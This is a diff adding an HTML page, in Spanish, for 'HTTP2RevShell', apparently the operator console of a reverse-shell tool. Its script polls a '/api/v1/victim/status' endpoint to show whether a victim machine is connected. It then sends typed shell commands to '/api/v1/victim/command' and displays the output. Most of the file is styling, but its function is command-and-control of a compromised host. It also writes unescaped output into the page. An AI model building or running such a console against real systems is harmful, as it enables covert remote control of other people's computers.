@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTTP2RevShell</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh; /* Asegura que el body ocupe toda la pantalla */
+            display: flex;
+            flex-direction: column;
+        }
+
+
+        /* width */
+        ::-webkit-scrollbar {
+          width: 10px;
+        }
+
+        /* Track */
+        ::-webkit-scrollbar-track {
+          box-shadow: inset 0 0 2px grey;
+          border-radius: 10px;
+        }
+
+        /* Handle */
+        ::-webkit-scrollbar-thumb {
+          background: #00ff00;
+          border-radius: 10px;
+        }
+
+        /* Handle on hover */
+        ::-webkit-scrollbar-thumb:hover {
+          background: #00d800;
+        }
+
+
+        h1, h3 {
+            text-align: center;
+            color: #00ff00;
+        }
+
+        .title {
+            display: inline;
+        }
+
+        a {
+            text-decoration: none; /* Elimina el subrayado */
+            color: inherit; /* Mantiene el color del texto o lo cambia según el contexto */
+        }
+
+        .container {
+            flex: 1; /* Hace que la consola crezca para ocupar el espacio disponible */
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            width: calc(63vw);
+            min-width: 375px;
+        }
+
+        #status {
+            margin: 0px;
+            display: inline;
+            float: right;
+        }
+
+        .status {
+            background-color: #333333;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 0px;
+            color: #00ff00;
+            border: 1px solid #333333;
+            width: calc(63vw);
+            min-width: 475px;
+        }
+
+        .status {
+            font-size: 18px;
+        }
+
+        .command {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        #response {
+            float: inline-start;
+            padding-bottom: 10px;
+            margin: 0px;
+        }
+
+        .input-area {
+            width: calc(63vw);
+            min-width: 475px;
+            padding: 10px;
+            background-color: #333333;
+            border: none;
+            color: #00ff00;
+            font-size: 14px;
+            border-radius: 5px;
+            outline: none;
+            margin-top: 10px;
+        }
+
+        .command input:focus {
+            background-color: #222222;
+        }
+
+        .command button {
+            padding: 10px 15px;
+            background-color: #333333;
+            color: #00ff00;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-left: 10px;
+        }
+
+        .command button:hover {
+            background-color: #444444;
+        }
+
+        .console {
+            background-color: #000000;
+            padding: 10px;
+            border-radius: 5px;
+            width: calc(63vw);
+            min-width: 475px;
+            height: calc(100vh - 200px); /* Ajusta dinámicamente la altura según el tamaño de la ventana */
+            overflow-y: scroll;
+            white-space: pre-wrap;
+            font-size: 14px;
+            color: #00ff00;
+            flex: 1;
+            max-height: 750px;
+        }
+
+        .error {
+            color: red;
+        }
+
+        .success {
+            color: green;
+        }
+    </style>
+    <script>
+        let statusInterval;
+
+        function updateStatus() {
+            fetch('/api/v1/victim/status')
+                .then(response => response.json())
+                .then(data => {
+                    const statusElement = document.getElementById('status');
+                    if (data.status === "Conectado") {
+                        statusElement.innerHTML = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' width='20' height='20'><path fill='#63E6BE' d='M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512z'/></svg>";
+                    } else {
+                        statusElement.innerHTML = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512' width='20' height='20'><path fill='#e66565' d='M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512z'/></svg>";
+                    }
+                })
+                .catch(error => console.error('Error al obtener el estado:', error));
+        }
+
+        function sendCommand() {
+            const commandInput = document.getElementById('command');
+            const responseElement = document.getElementById('response');
+            const command = commandInput.value;
+
+            // Limpia el input después de capturar el valor
+            commandInput.value = '';
+
+            if (command === "clear") {
+                // Limpia la consola eliminando todo el contenido
+                responseElement.innerHTML = "";
+            } else {
+                fetch('/api/v1/victim/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ command: command })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.error) {
+                        responseElement.innerHTML += `<b class='error'>&gt; ${command}</b><br><span class='error'>Error: ${data.error}<br></span><br>`;
+                    } else {
+                        const formattedResponse = data.response.replace(/\n/g, '<br>');
+                        responseElement.innerHTML += `<b>&gt; ${command}</b><br><span class='success'>${formattedResponse}</span><br>`;
+                    }
+
+                    scrollToBottom(responseElement);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el comando:', error);
+                    responseElement.innerHTML += `<b class='error'>&gt; ${command}</b><br><span class='error'>Error al enviar comando.<br></span><br>`;
+
+                    scrollToBottom(responseElement);
+                });
+            }
+        }
+
+        // Función para garantizar el desplazamiento al final del contenido
+        function scrollToBottom(element) {
+            const lastChild = element.lastElementChild;
+            if (lastChild) {
+                lastChild.scrollIntoView({ behavior: 'smooth' });
+            } else {
+                element.scrollTop = element.scrollHeight;
+            }
+        }
+
+        window.onload = function() {
+            updateStatus();
+            statusInterval = setInterval(updateStatus, 10000); // Actualizar cada 10 segundos
+        }
+
+        function checkEnter(event) {
+            if (event.key === 'Enter') {  // Verifica si la tecla presionada es Enter
+                event.preventDefault();  // Evita que se haga un salto de línea (comportamiento predeterminado)
+                sendCommand();  // Llama a la función que deseas ejecutar
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="status">
+            <p class="title"><a href="https://github.com/vpanal/http2revshell/"  target="_blank">HTTP2RevShell</a></p>
+            <p id="status">Cargando estado...</p>
+        </div>
+
+        <div class="console">
+            <p id="response">Esperando respuesta...<br></p>
+        </div>
+
+        <input type="text" class="input-area" id="command" placeholder="Escribe un comando" onkeydown="checkEnter(event)">
+    </div>
+</body>
+</html>
